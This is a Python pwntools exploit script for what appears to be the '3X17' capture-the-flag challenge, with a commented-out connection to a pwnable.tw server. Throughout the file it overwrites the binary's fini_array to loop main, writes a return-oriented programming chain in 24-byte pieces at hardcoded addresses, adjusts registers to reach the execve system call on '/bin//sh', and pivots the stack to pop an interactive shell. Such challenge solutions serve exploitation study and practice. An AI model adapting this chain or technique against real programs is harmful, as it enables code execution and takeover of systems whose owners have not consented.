def convert_address(addr):
    return bytes(str(addr).encode('ascii'))

def write_24_bytes(addr, payload):
    conn.recv(5)
    conn.sendline(addr)
    conn.recv(5)
    conn.send(payload)

def main():
    # create infinite main() loop
    infinite_loop_payload = p64(0x402960) + p64(0x401b6d) + p64(0x0)
    write_24_bytes(convert_address(0x4B40F0), infinite_loop_payload)

    # -----------------------------------------------
    # write rop chain on new stack address 0x4b4108 which spawns a shell
    shell_payload_0 = p64(0x406c30) + p64(0x4b70e0) + p64(0x41e4af)
    write_24_bytes(convert_address(0x4B4108), shell_payload_0)

    shell_payload_1 = bytes('/bin//sh'.encode('ascii'))\
        + p64(0x47c1b1) + p64(0x406c30) 
    write_24_bytes(convert_address(0x4B4120), shell_payload_1)

    shell_payload_2 = p64(0x4b70e8) + p64(0x442110) + p64(0x47c1b1) 
    write_24_bytes(convert_address(0x4B4138), shell_payload_2)

    shell_payload_3 = p64(0x401696) + p64(0x4b70e0) + p64(0x406c30)
    write_24_bytes(convert_address(0x4B4150), shell_payload_3)

    shell_payload_4 = p64(0x4b70e8) + p64(0x446e35) + p64(0x4b70e8)
    write_24_bytes(convert_address(0x4B4168), shell_payload_4)

    shell_payload_5 = p64(0x420a80) + p64(0x471821) + p64(0x471821)
    write_24_bytes(convert_address(0x4B4180), shell_payload_5)
    # rax == 0x1c == 28, we need rax== 0x3b == 59, so we have to add 31

    #eax+=3
    shell_payload_6 = p64(0x471821) + p64(0x471821) + p64(0x471821)
    write_24_bytes(convert_address(0x4B4198), shell_payload_6)
    write_24_bytes(convert_address(0x4B41B0), shell_payload_6)
    write_24_bytes(convert_address(0x4B41C8), shell_payload_6)

    shell_payload_7 = p64(0x471821) + p64(0x471810) + p64(0x4022b4)
    write_24_bytes(convert_address(0x4B41E0), shell_payload_7)
    # -----------------------------------------------

    # write rop which change esp to 0x4b4108
    stack_setter_payload = p64(0x44f62b) + p64(0x48a578) + p64(0x0)
    write_24_bytes(convert_address(0x4B4320), stack_setter_payload)
    pause()
    
    # write address for ebx increase
    # which finally triggers esp changer code
    ebx_inc_payload = p64(0x4715ec) + p64(0x4b4108) + p64(0x406c30) 
    write_24_bytes(convert_address(0x4B40F8), ebx_inc_payload)
    pause()


from pwn import *
#context.log_level = 'DEBUG'
# conn = remote('chall.pwnable.tw',10105)
conn = process('./3X17')
print("Overwriting finit array with ROP chain...")
main()
print("Done, Shell should pop up :)")
conn.interactive()